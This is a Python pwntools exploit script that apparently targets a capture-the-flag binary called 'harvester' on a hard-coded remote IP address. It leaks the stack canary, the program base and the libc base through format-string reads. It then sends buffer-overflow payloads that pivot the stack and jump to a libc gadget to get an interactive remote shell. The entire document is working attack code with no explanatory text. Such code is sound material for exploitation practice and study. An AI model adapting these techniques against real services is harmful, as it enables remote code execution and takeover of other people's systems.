from pwn import *

p = remote("178.62.70.150", 31736)

elf = ELF("harvester")
libc = elf.libc

def inventory():
	p.sendlineafter("> ", "2")
	p.sendlineafter("> ", "y")
	p.sendlineafter("> ", "-11")

def fight(data):
	p.sendlineafter("> ", "1")
	p.sendlineafter("> ", data)



fight("%11$p")
p.recvline()
p.recvuntil(": ")
canary = int(p.recv(18), 16)
fight("%20$p")
p.recvline()
p.recvuntil(": ")
elf.address = int(p.recv(14), 16) - 0x1000
fight("%21$p")
p.recvline()
p.recvuntil(": ")
libc.address = int(p.recv(14), 16) - libc.symbols['__libc_start_main'] - 0xe7


log.info(f"CANARY:   {hex(canary)}")
log.info(f"ELF   :   {hex(elf.address)}")
log.info(f"LIBC  :   {hex(libc.address)}")


inventory()

p.sendlineafter("> ", "3")

payload = b"A"*40
payload += p64(canary)
payload += p64(elf.bss() + 0x330)
payload += p64(elf.symbols['stare'] + 0xa0)

p.sendafter("> ", payload)
payload = b"A"*40
payload += p64(canary)
payload += p64(0)
payload += p64(libc.address + 0x10a41c)


p.send(payload)
p.interactive()	